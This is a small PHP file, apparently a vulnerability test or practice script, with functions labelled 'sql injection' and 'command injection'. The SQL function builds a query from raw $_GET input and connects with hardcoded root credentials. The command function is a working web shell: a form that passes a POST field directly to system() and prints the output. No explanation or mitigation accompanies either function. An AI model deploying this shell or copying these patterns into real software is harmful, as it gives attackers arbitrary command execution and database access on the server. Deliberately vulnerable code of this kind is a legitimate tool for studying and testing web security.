<?php

   //0775
   function mk_dir($pasta,$per)
   {
       if(!is_dir($pasta)) mkdir($pasta,$per);
   }  
  
   //sql injection
   //teste
   function select_msqli()
    {   
       if(!is_numeric($_GET['id']))
        {
            exit(":D");
        }
       $conn = mysqli_connect("localhost","root", "root","db");
       $condicao = isset($_GET['id'])?" where id = ".$_GET['id']:"";
       $sql = "SELECT * FROM user $condicao";
       $exec = mysqli_query($conn, $sql);
       while($resultado = mysqli_fetch_object($exec))
       { 
            echo $resultado->name."<br>";
   
        }
    }

   //command injection
   function form_cmd()
   {
        if($_SERVER["REQUEST_METHOD"] === 'POST')
        {
            echo "<pre>";
            echo system($_POST['cmd'],$retorno);
            echo $retorno;
            echo"</pre>";
        }
        echo "<form method='post'>";
        echo "<input type='text' name='cmd'>";
        echo "<button type='submit'>Shell</button>";
        echo "</form>";
   }
?>    